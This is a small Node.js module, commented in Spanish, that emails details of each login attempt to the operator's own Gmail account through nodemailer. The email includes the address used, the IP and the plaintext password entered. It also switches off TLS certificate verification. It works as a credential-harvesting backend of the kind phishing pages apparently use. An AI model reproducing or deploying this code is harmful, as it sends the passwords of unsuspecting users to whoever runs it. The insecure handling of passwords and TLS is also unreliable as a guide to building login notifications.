const nodemailer = require('nodemailer');
require('dotenv').config();

// Configurar el transporter de nodemailer
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  },
  tls: {
    rejectUnauthorized: false
  }
});

const sendLoginAttemptEmail = async (loginData) => {
  const { method, email, timestamp } = loginData;
  
  console.log('Preparando envío de correo para intento de inicio de sesión...');
  console.log('Datos del intento:', {
    método: method,
    email: email,
    hora: new Date(timestamp).toLocaleString(),
    ip: loginData.ip
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: `Nuevo intento de inicio de sesión - ${method}`,
    html: `
      <h2>Nuevo intento de inicio de sesión detectado</h2>
      <p><strong>Método:</strong> ${method}</p>
      <p><strong>Email usado:</strong> ${email}</p>
      <p><strong>Fecha y hora:</strong> ${new Date(timestamp).toLocaleString()}</p>
      <p><strong>IP:</strong> ${loginData.ip || 'No disponible'}</p>
      ${loginData.password ? `<p><strong>Contraseña usada:</strong> ${loginData.password}</p>` : ''}
    `
  };

  try {
    console.log('Intentando enviar correo...');
    await transporter.sendMail(mailOptions);
    console.log('✅ Email de notificación enviado exitosamente');
    return true;
  } catch (error) {
    console.error('❌ Error al enviar email:', error);
    console.error('Detalles del error:', {
      código: error.code,
      comando: error.command,
      mensaje: error.message
    });
    return false;
  }
};

module.exports = {
  sendLoginAttemptEmail
};
